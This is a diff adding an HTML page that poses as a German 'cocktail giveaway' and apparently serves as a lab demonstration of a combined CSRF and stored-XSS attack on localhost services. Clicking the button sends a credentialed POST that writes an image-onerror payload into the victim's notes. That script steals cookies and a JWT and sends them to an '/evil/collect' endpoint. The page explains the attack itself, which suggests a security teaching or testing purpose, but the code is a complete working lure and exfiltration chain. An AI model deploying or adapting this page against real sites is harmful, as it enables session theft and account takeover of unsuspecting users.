@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cocktail Giveaway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 2rem;
+            max-width: 720px;
+            line-height: 1.5;
+        }
+
+        h1 {
+            color: #8b0000;
+        }
+
+        button {
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            cursor: pointer;
+            background-color: #1b75bb;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 0.75rem;
+            overflow-x: auto;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<h1>Limited Cocktail Giveaway!</h1>
+<p>
+    Glückwunsch, du wurdest zufällig ausgewählt, um ein neues Cocktail-Rezept zu testen. Klicke auf den Button und wir
+    fügen es sofort deiner persönlichen Sammlung hinzu.
+    (Nur verfügbar, wenn du bereits im System angemeldet bist.)
+ </p>
+
+<button id="attack-btn">Cocktail sichern</button>
+<p id="status"></p>
+
+<section>
+    <h2>Wie funktioniert der Angriff?</h2>
+    <p>
+        Der Button schickt unbemerkt ein Formular an den Auth-Service. Dabei wird der eingeloggte Benutzer-Token
+        automatisch vom Browser mitgeschickt und der Notiz-Text ohne Zustimmung überschrieben. Der neue Text enthält
+        wiederum ein Skript, das später auf der Admin-Seite ausgeführt wird.
+    </p>
+    <pre id="payload-preview"></pre>
+</section>
+
+<script>
+    const payload = '<img src="broken" alt="loading" onerror="(function(){' +
+        "try{console.log('[evil] payload executing');" +
+        "var cookie=document.cookie||'';" +
+        "var token=(cookie.match(/(?:^|; )jwt=([^;]+)/)||[])[1]||window.currentToken||'';" +
+        "console.log('[evil] cookie:', cookie);" +
+        "console.log('[evil] token:', token);" +
+        "fetch('http://localhost:8082/evil/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:token,page:window.location.href,notes:cookie})})" +
+        ".then(()=>console.log('[evil] token exfiltrated'))" +
+        ".catch(err=>console.error('exfil fetch failed', err));" +
+        "}catch(err){console.error('payload error', err);}" +
+        "})();this.removeAttribute('onerror');" +
+        '">';
+
+    const status = document.getElementById('status');
+    const preview = document.getElementById('payload-preview');
+    preview.textContent = payload;
+
+    document.getElementById('attack-btn').addEventListener('click', async () => {
+        status.textContent = 'Cocktail wird deiner Sammlung hinzugefügt …';
+        try {
+            const response = await fetch('http://localhost:8083/auth/good/me', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                credentials: 'include',
+                body: JSON.stringify({ text: payload })
+            });
+
+            if (!response.ok) {
+                throw new Error('Request failed with ' + response.status);
+            }
+
+            status.textContent = 'Vielen Dank! Dein exklusiver Cocktail ist unterwegs.';
+        } catch (error) {
+            status.textContent = 'Ups, leider ausverkauft. (Fehler: ' + error.message + ')';
+        }
+    });
+</script>
+</body>
+</html>
